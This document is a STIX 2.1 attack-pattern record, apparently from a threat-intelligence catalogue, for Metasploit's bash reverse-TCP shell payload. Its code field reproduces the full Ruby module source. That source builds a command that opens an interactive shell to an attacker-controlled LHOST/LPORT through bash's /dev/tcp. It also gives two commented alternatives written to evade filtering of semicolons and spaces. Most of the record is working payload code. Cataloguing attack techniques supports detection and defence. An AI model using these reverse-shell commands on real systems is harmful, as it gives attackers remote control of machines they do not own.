{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c53b2340-9cb3-4add-abf4-398cec91d342",
    "created": "2024-08-14T16:33:19.338469Z",
    "modified": "2024-08-14T16:33:19.338472Z",
    "name": "Unix Command Shell, Reverse TCP (/dev/tcp)",
    "description": " Creates an interactive shell via bash's builtin /dev/tcp.  This will not work on circa 2009 and older Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_bash.rb",
            "external_id": "reverse_bash.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = :dynamic\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Reverse TCP (/dev/tcp)',\n     'Description'   => %q{\n        Creates an interactive shell via bash's builtin /dev/tcp.\n\n        This will not work on circa 2009 and older Debian-based Linux\n        distributions (including Ubuntu) because they compile bash\n        without the /dev/tcp feature.\n      },\n     'Author'        => 'hdm',\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd_bash',\n     'RequiredCmd'   => 'bash-tcp',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash']),\n        OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    fd = rand(200) + 20\n    return \"#{datastore['BashPath']} -c '0<&#{fd}-;exec #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']};#{datastore['ShellPath']} <&#{fd} >&#{fd} 2>&#{fd}'\";\n    # same thing, no semicolons\n    #return \"/bin/bash #{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} <&#{fd} >&#{fd}\"\n    # same thing, no spaces\n    #return \"s=${IFS:0:1};eval$s\\\"bash${s}#{fd}<>/dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']}$s<&#{fd}$s>&#{fd}&\\\"\"\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}